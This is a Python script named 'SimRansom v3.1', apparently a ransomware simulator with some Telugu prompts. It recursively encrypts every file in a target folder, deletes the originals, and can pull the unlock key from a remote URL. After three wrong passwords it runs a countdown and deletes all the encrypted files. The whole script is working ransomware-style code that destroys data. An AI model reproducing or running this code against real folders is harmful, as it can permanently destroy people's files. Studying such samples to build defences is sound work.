#!/usr/bin/env python3
import os
import sys
import base64
import hashlib
import time
import requests
from getpass import getpass
from cryptography.fernet import Fernet
from colorama import Fore, init
from datetime import datetime

init(autoreset=True)

MAX_ATTEMPTS = 3
COUNTDOWN_SECONDS = 30
ENCRYPTED_EXT = ".locked"

# ✅ Generate Fernet Key using SHA256 of password
def generate_key(password):
    key = hashlib.sha256(password.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key))

# ✅ Encrypt a single file
def encrypt_file(filepath, fernet):
    with open(filepath, 'rb') as file:
        data = file.read()
    encrypted = fernet.encrypt(data)
    new_path = filepath + ENCRYPTED_EXT
    with open(new_path, 'wb') as file:
        file.write(encrypted)
    os.remove(filepath)
    print(Fore.GREEN + f"[✓] Encrypted: {filepath}")

# ✅ Decrypt a single file
def decrypt_file(filepath, fernet):
    with open(filepath, 'rb') as file:
        data = file.read()
    decrypted = fernet.decrypt(data)
    original_path = filepath.replace(ENCRYPTED_EXT, "")
    with open(original_path, 'wb') as file:
        file.write(decrypted)
    os.remove(filepath)
    print(Fore.CYAN + f"[✓] Decrypted: {original_path}")

# ✅ Process all files in folder recursively
def process_folder(folder, fernet, mode):
    total = 0
    for root, _, files in os.walk(folder):
        for name in files:
            filepath = os.path.join(root, name)
            if mode == "lock" and not filepath.endswith(ENCRYPTED_EXT):
                encrypt_file(filepath, fernet)
                total += 1
            elif mode == "unlock" and filepath.endswith(ENCRYPTED_EXT):
                decrypt_file(filepath, fernet)
                total += 1
    print(Fore.GREEN + f"\n✅ Total files processed: {total}")

# ✅ Self-Destruct Countdown (30 sec)
def countdown_and_delete(folder):
    print(Fore.RED + "\n💣 Too many wrong attempts! Initiating self-destruct...")
    print(Fore.YELLOW + f"⏳ Self-destructing in {COUNTDOWN_SECONDS} seconds. Press Ctrl+C to cancel.")
    try:
        for i in range(COUNTDOWN_SECONDS, 0, -1):
            sys.stdout.write(f"\r⏱️ {i} seconds remaining...")
            sys.stdout.flush()
            time.sleep(1)
        print("\n💥 Time's up!")
    except KeyboardInterrupt:
        print(Fore.CYAN + "\n🛑 Self-destruct aborted by user.")
        sys.exit(0)

    # 🧨 Delete all .locked files
    for root, _, files in os.walk(folder):
        for name in files:
            if name.endswith(ENCRYPTED_EXT):
                filepath = os.path.join(root, name)
                try:
                    os.remove(filepath)
                    print(Fore.RED + f"Deleted: {name}")
                except Exception as e:
                    print(Fore.RED + f"Error deleting {name}: {e}")
    print(Fore.RED + "☠️  All encrypted files destroyed.")

# ✅ Fetch unlock key from remote GitHub JSON URL
def fetch_remote_key(url):
    try:
        res = requests.get(url, timeout=10)
        if res.status_code == 200:
            data = res.json()
            return data.get("key")
        else:
            print(Fore.RED + f"❌ Failed to fetch key. HTTP {res.status_code}")
    except Exception as e:
        print(Fore.RED + f"❌ Error fetching key: {e}")
    return None

# ✅ Main Program
def main():
    print(Fore.MAGENTA + "\n🔐 SimRansom v3.1 — Remote Unlock + Countdown Self-Destruct")

    try:
        mode = input(Fore.YELLOW + "🔄 Mode (lock/unlock): ").strip().lower()
        if mode not in ["lock", "unlock"]:
            print(Fore.RED + "❌ Invalid mode.")
            return

        folder = input("📁 Enter target folder path: ").strip()
        if not os.path.isdir(folder):
            print(Fore.RED + "❌ Folder not found.")
            return

        attempts = 0
        password = None

        while attempts < MAX_ATTEMPTS:
            remote_url = input("🌐 Remote Unlock URL (GitHub JSON) లేదా enter skip చేయండి: ").strip()
            if remote_url:
                password = fetch_remote_key(remote_url)
                if password:
                    print(Fore.GREEN + "🔓 Password fetched from remote URL!")
                else:
                    print(Fore.RED + "⚠️ Invalid remote response.")
            else:
                password = getpass("🔑 Enter password: ")

            try:
                fernet = generate_key(password)
                if mode == "unlock":
                    # test one file to validate password
                    test_pass = False
                    for root, _, files in os.walk(folder):
                        for f in files:
                            if f.endswith(ENCRYPTED_EXT):
                                testfile = os.path.join(root, f)
                                with open(testfile, 'rb') as file:
                                    fernet.decrypt(file.read())
                                test_pass = True
                                break
                        if test_pass:
                            break
                    if not test_pass:
                        print(Fore.YELLOW + "⚠️ No encrypted files found.")
                        return
                break
            except:
                attempts += 1
                print(Fore.RED + f"[X] Wrong password! ({attempts}/{MAX_ATTEMPTS})")
                if attempts == MAX_ATTEMPTS:
                    countdown_and_delete(folder)
                    return

        print(Fore.BLUE + f"⚙️ Processing '{folder}' in {mode} mode...\n")
        process_folder(folder, fernet, mode)

    except KeyboardInterrupt:
        print(Fore.RED + "\n⛔ Interrupted by user.")

if __name__ == "__main__":
    main()
